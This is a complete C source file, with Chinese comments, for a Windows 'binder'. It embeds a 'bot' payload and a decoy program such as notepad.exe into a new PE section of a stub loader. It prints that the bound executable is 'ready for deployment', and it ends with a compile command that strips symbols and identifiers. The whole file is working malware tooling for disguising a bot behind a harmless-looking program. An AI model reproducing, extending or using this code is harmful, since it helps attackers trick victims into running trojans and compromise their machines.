#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define BINDER_MAGIC 0xDEADBEEF
#define BIND_SECTION_NAME ".bind"

// 绑定数据结构
typedef struct {
    DWORD magic;
    DWORD bot_size;
    DWORD decoy_size;
    BYTE data[1]; // 可变长度数据
} BindingData;

// 读取文件到内存
BYTE* read_file_to_memory(const WCHAR* file_path, DWORD* file_size) {
    HANDLE hFile = CreateFileW(file_path, GENERIC_READ, FILE_SHARE_READ, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[Binder] Failed to open file: %ls (Error: %d)\n", file_path, GetLastError());
        return NULL;
    }
    
    *file_size = GetFileSize(hFile, NULL);
    if (*file_size == INVALID_FILE_SIZE) {
        wprintf(L"[Binder] Failed to get file size: %ls\n", file_path);
        CloseHandle(hFile);
        return NULL;
    }
    
    BYTE* buffer = (BYTE*)malloc(*file_size);
    if (!buffer) {
        wprintf(L"[Binder] Failed to allocate memory for file: %ls\n", file_path);
        CloseHandle(hFile);
        return NULL;
    }
    
    DWORD bytes_read;
    if (!ReadFile(hFile, buffer, *file_size, &bytes_read, NULL) || bytes_read != *file_size) {
        wprintf(L"[Binder] Failed to read file: %ls\n", file_path);
        free(buffer);
        CloseHandle(hFile);
        return NULL;
    }
    
    CloseHandle(hFile);
    wprintf(L"[Binder] Successfully read file: %ls (%d bytes)\n", file_path, *file_size);
    return buffer;
}

// 检查PE文件有效性
BOOL is_valid_pe_file(BYTE* data, DWORD size) {
    if (size < sizeof(IMAGE_DOS_HEADER)) return FALSE;
    
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)data;
    if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;
    
    if (dos_header->e_lfanew >= size || dos_header->e_lfanew < 0) return FALSE;
    
    if (size < dos_header->e_lfanew + sizeof(IMAGE_NT_HEADERS)) return FALSE;
    
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(data + dos_header->e_lfanew);
    if (nt_headers->Signature != IMAGE_NT_SIGNATURE) return FALSE;
    
    return TRUE;
}

// 检查PE文件架构
BOOL is_64bit_pe(BYTE* data) {
    PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)data;
    PIMAGE_NT_HEADERS nt_headers = (PIMAGE_NT_HEADERS)(data + dos_header->e_lfanew);
    return (nt_headers->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64);
}

// 添加绑定节区到PE文件
BOOL add_binding_section(const WCHAR* target_file, BYTE* bot_data, DWORD bot_size, 
                        BYTE* decoy_data, DWORD decoy_size) {
    
    wprintf(L"[Binder] Adding binding section to: %ls\n", target_file);
    
    HANDLE hFile = CreateFileW(target_file, GENERIC_READ | GENERIC_WRITE, 0, 
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        wprintf(L"[Binder] Failed to open target file: %d\n", GetLastError());
        return FALSE;
    }
    
    // 读取PE头
    IMAGE_DOS_HEADER dos_header;
    DWORD bytes_read;
    
    SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, &dos_header, sizeof(dos_header), &bytes_read, NULL)) {
        wprintf(L"[Binder] Failed to read DOS header\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
        wprintf(L"[Binder] Invalid DOS signature\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 读取NT头
    IMAGE_NT_HEADERS nt_headers;
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    if (!ReadFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_read, NULL)) {
        wprintf(L"[Binder] Failed to read NT headers\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
        wprintf(L"[Binder] Invalid NT signature\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    wprintf(L"[Binder] Target PE file: %s, Sections: %d\n", 
           (nt_headers.FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ? L"64-bit" : L"32-bit",
           nt_headers.FileHeader.NumberOfSections);
    
    // 计算绑定数据大小
    DWORD binding_data_size = sizeof(BindingData) - 1 + bot_size + decoy_size;
    DWORD aligned_size = (binding_data_size + nt_headers.OptionalHeader.FileAlignment - 1) & 
                        ~(nt_headers.OptionalHeader.FileAlignment - 1);
    
    wprintf(L"[Binder] Binding data size: %d, Aligned size: %d\n", binding_data_size, aligned_size);
    
    // 创建绑定数据
    BYTE* binding_buffer = (BYTE*)calloc(1, aligned_size);
    if (!binding_buffer) {
        wprintf(L"[Binder] Failed to allocate binding buffer\n");
        CloseHandle(hFile);
        return FALSE;
    }
    
    BindingData* binding = (BindingData*)binding_buffer;
    binding->magic = BINDER_MAGIC;
    binding->bot_size = bot_size;
    binding->decoy_size = decoy_size;
    
    // 复制数据
    memcpy(binding->data, bot_data, bot_size);
    memcpy(binding->data + bot_size, decoy_data, decoy_size);
    
    wprintf(L"[Binder] Prepared binding data: magic=0x%08X, bot_size=%d, decoy_size=%d\n",
           binding->magic, binding->bot_size, binding->decoy_size);
    
    // 读取现有节区头
    IMAGE_SECTION_HEADER* sections = (IMAGE_SECTION_HEADER*)malloc(
        sizeof(IMAGE_SECTION_HEADER) * nt_headers.FileHeader.NumberOfSections);
    
    SetFilePointer(hFile, dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS), NULL, FILE_BEGIN);
    if (!ReadFile(hFile, sections, 
                  sizeof(IMAGE_SECTION_HEADER) * nt_headers.FileHeader.NumberOfSections, 
                  &bytes_read, NULL)) {
        wprintf(L"[Binder] Failed to read section headers\n");
        free(sections);
        free(binding_buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 找到最后一个节区
    IMAGE_SECTION_HEADER* last_section = &sections[nt_headers.FileHeader.NumberOfSections - 1];
    
    wprintf(L"[Binder] Last section: %s, VirtualAddress=0x%08X, Size=0x%08X\n",
           last_section->Name, last_section->VirtualAddress, last_section->Misc.VirtualSize);
    
    // 创建新节区头
    IMAGE_SECTION_HEADER new_section = {0};
    strcpy_s((char*)new_section.Name, IMAGE_SIZEOF_SHORT_NAME, BIND_SECTION_NAME);
    new_section.Misc.VirtualSize = binding_data_size;
    new_section.VirtualAddress = (last_section->VirtualAddress + last_section->Misc.VirtualSize + 
                                 nt_headers.OptionalHeader.SectionAlignment - 1) & 
                                ~(nt_headers.OptionalHeader.SectionAlignment - 1);
    new_section.SizeOfRawData = aligned_size;
    new_section.PointerToRawData = (last_section->PointerToRawData + last_section->SizeOfRawData + 
                                   nt_headers.OptionalHeader.FileAlignment - 1) & 
                                  ~(nt_headers.OptionalHeader.FileAlignment - 1);
    new_section.Characteristics = IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_READ;
    
    wprintf(L"[Binder] New section: VirtualAddress=0x%08X, PointerToRawData=0x%08X, Size=0x%08X\n",
           new_section.VirtualAddress, new_section.PointerToRawData, new_section.SizeOfRawData);
    
    // 更新PE头
    nt_headers.FileHeader.NumberOfSections++;
    nt_headers.OptionalHeader.SizeOfImage = new_section.VirtualAddress + 
                                           ((new_section.Misc.VirtualSize + 
                                             nt_headers.OptionalHeader.SectionAlignment - 1) & 
                                            ~(nt_headers.OptionalHeader.SectionAlignment - 1));
    
    wprintf(L"[Binder] Updated PE headers: Sections=%d, SizeOfImage=0x%08X\n",
           nt_headers.FileHeader.NumberOfSections, nt_headers.OptionalHeader.SizeOfImage);
    
    // 写入更新的NT头
    SetFilePointer(hFile, dos_header.e_lfanew, NULL, FILE_BEGIN);
    DWORD bytes_written;
    if (!WriteFile(hFile, &nt_headers, sizeof(nt_headers), &bytes_written, NULL)) {
        wprintf(L"[Binder] Failed to write NT headers\n");
        free(sections);
        free(binding_buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 写入新节区头
    SetFilePointer(hFile, dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + 
                   sizeof(IMAGE_SECTION_HEADER) * (nt_headers.FileHeader.NumberOfSections - 1), 
                   NULL, FILE_BEGIN);
    if (!WriteFile(hFile, &new_section, sizeof(new_section), &bytes_written, NULL)) {
        wprintf(L"[Binder] Failed to write new section header\n");
        free(sections);
        free(binding_buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    // 写入绑定数据
    SetFilePointer(hFile, new_section.PointerToRawData, NULL, FILE_BEGIN);
    if (!WriteFile(hFile, binding_buffer, aligned_size, &bytes_written, NULL)) {
        wprintf(L"[Binder] Failed to write binding data\n");
        free(sections);
        free(binding_buffer);
        CloseHandle(hFile);
        return FALSE;
    }
    
    free(sections);
    free(binding_buffer);
    CloseHandle(hFile);
    
    wprintf(L"[Binder] Successfully added binding section\n");
    return TRUE;
}

// 显示使用说明
void show_usage() {
    wprintf(L"\n=== Windows 8-11 Compatible Binder ===\n");
    wprintf(L"Usage: binder.exe <stubloader.exe> <bot.exe> <decoy.exe> <output.exe>\n\n");
    wprintf(L"Parameters:\n");
    wprintf(L"  stubloader.exe  - The stub loader executable (must be 64-bit)\n");
    wprintf(L"  bot.exe         - The bot payload to embed\n");
    wprintf(L"  decoy.exe       - The decoy application to embed\n");
    wprintf(L"  output.exe      - The output bound executable\n\n");
    wprintf(L"Example:\n");
    wprintf(L"  binder.exe stubloader.exe bot.exe notepad.exe bound_app.exe\n\n");
    wprintf(L"Requirements:\n");
    wprintf(L"  - All executables must be valid PE files\n");
    wprintf(L"  - Stubloader must be 64-bit for Windows 8-11 compatibility\n");
    wprintf(L"  - Bot and decoy can be 32-bit or 64-bit\n");
    wprintf(L"  - Sufficient disk space for the combined file\n\n");
}

// 主函数
int wmain(int argc, WCHAR* argv[]) {
    wprintf(L"[Binder] Windows 8-11 Compatible File Binder v1.0\n");
    wprintf(L"[Binder] Supports Windows 8, 8.1, 10, and 11\n\n");
    
    if (argc != 5) {
        show_usage();
        return 1;
    }
    
    WCHAR* stubloader_path = argv[1];
    WCHAR* bot_path = argv[2];
    WCHAR* decoy_path = argv[3];
    WCHAR* output_path = argv[4];
    
    wprintf(L"[Binder] Input files:\n");
    wprintf(L"  Stubloader: %ls\n", stubloader_path);
    wprintf(L"  Bot:        %ls\n", bot_path);
    wprintf(L"  Decoy:      %ls\n", decoy_path);
    wprintf(L"  Output:     %ls\n\n", output_path);
    
    // 读取文件
    DWORD stubloader_size, bot_size, decoy_size;
    BYTE* stubloader_data = read_file_to_memory(stubloader_path, &stubloader_size);
    BYTE* bot_data = read_file_to_memory(bot_path, &bot_size);
    BYTE* decoy_data = read_file_to_memory(decoy_path, &decoy_size);
    
    if (!stubloader_data || !bot_data || !decoy_data) {
        wprintf(L"[Binder] Failed to read input files\n");
        if (stubloader_data) free(stubloader_data);
        if (bot_data) free(bot_data);
        if (decoy_data) free(decoy_data);
        return 1;
    }
    
    // 验证PE文件
    if (!is_valid_pe_file(stubloader_data, stubloader_size)) {
        wprintf(L"[Binder] Invalid PE file: %ls\n", stubloader_path);
        goto cleanup;
    }
    
    if (!is_valid_pe_file(bot_data, bot_size)) {
        wprintf(L"[Binder] Invalid PE file: %ls\n", bot_path);
        goto cleanup;
    }
    
    if (!is_valid_pe_file(decoy_data, decoy_size)) {
        wprintf(L"[Binder] Invalid PE file: %ls\n", decoy_path);
        goto cleanup;
    }
    
    // 检查架构
    BOOL stubloader_64bit = is_64bit_pe(stubloader_data);
    BOOL bot_64bit = is_64bit_pe(bot_data);
    BOOL decoy_64bit = is_64bit_pe(decoy_data);
    
    wprintf(L"[Binder] File architectures:\n");
    wprintf(L"  Stubloader: %s\n", stubloader_64bit ? L"64-bit" : L"32-bit");
    wprintf(L"  Bot:        %s\n", bot_64bit ? L"64-bit" : L"32-bit");
    wprintf(L"  Decoy:      %s\n\n", decoy_64bit ? L"64-bit" : L"32-bit");
    
    // 验证stubloader必须是64位（Windows 8-11兼容性要求）
    if (!stubloader_64bit) {
        wprintf(L"[Binder] Error: Stubloader must be 64-bit for Windows 8-11 compatibility\n");
        goto cleanup;
    }
    
    // 复制stubloader作为输出文件
    wprintf(L"[Binder] Creating output file...\n");
    if (!CopyFileW(stubloader_path, output_path, FALSE)) {
        wprintf(L"[Binder] Failed to copy stubloader: %d\n", GetLastError());
        goto cleanup;
    }
    
    // 添加绑定节区
    if (!add_binding_section(output_path, bot_data, bot_size, decoy_data, decoy_size)) {
        wprintf(L"[Binder] Failed to add binding section\n");
        DeleteFileW(output_path);
        goto cleanup;
    }
    
    // 获取输出文件大小
    HANDLE hOutput = CreateFileW(output_path, GENERIC_READ, FILE_SHARE_READ, 
                                 NULL, OPEN_EXISTING, 0, NULL);
    if (hOutput != INVALID_HANDLE_VALUE) {
        DWORD output_size = GetFileSize(hOutput, NULL);
        CloseHandle(hOutput);
        
        wprintf(L"\n=== Binding Successful ===\n");
        wprintf(L"Output file: %ls\n", output_path);
        wprintf(L"File sizes:\n");
        wprintf(L"  Stubloader: %d bytes\n", stubloader_size);
        wprintf(L"  Bot:        %d bytes\n", bot_size);
        wprintf(L"  Decoy:      %d bytes\n", decoy_size);
        wprintf(L"  Output:     %d bytes\n", output_size);
        wprintf(L"  Overhead:   %d bytes\n", output_size - stubloader_size - bot_size - decoy_size);
        wprintf(L"\nThe bound executable is ready for deployment.\n");
        wprintf(L"Compatible with Windows 8, 8.1, 10, and 11 (64-bit).\n");
    }
    
    free(stubloader_data);
    free(bot_data);
    free(decoy_data);
    return 0;

cleanup:
    if (stubloader_data) free(stubloader_data);
    if (bot_data) free(bot_data);
    if (decoy_data) free(decoy_data);
    return 1;
}

/*
编译命令 (Windows 8-11兼容):
x86_64-w64-mingw32-gcc prop/binder.c -o binder.exe \
-D_WIN32_WINNT=0x0602 -DUNICODE -D_UNICODE \
-ffunction-sections -fdata-sections \
-Wl,--gc-sections,--strip-all \
-Os -flto -s -static -static-libgcc \
-fno-ident -fno-stack-protector
*/
